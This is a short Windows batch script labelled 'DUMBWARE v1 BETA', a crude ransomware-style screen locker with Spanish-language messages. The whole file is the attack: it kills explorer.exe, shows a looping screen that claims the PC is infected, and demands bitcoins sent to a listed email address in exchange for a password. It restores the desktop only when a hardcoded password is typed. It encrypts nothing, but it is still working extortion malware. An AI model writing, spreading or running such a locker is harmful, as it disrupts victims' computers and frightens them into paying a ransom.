color 0C
@echo off 
title DUMBWARE v1 BETA
taskkill /f /im explorer.exe 
:bucle 
cls               
echo ==============================================================
echo A SIDO INFECTADO POR EL RANSOMWARE DUMBWARE
echo SIGUE LOS PASOS SI QUIERES RECUPERAR TU PC
echo ==============================================================
echo 1. MANDAME BITCOINS por un correo para conseguir la contraseña
echo si no me mandas las bitcoins su PC no sera recuperada
echo ==============================================================
echo 2. pon la contraseña recibido por correo 
echo para recuperar su computadora
echo ==============================================================
echo informacion de recuperacion
echo correo:dumbwarerecovery@gmail.com
echo BITCOINS:666
echo ============================================================== 
set /p pass= PASSWORD: 
if %pass%==DUMBWAREPC109errorDUMB (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo LA CONTRASEÑA ES CORRECTA,SIGA CON SU PC
start explorer.exe 
pause
exit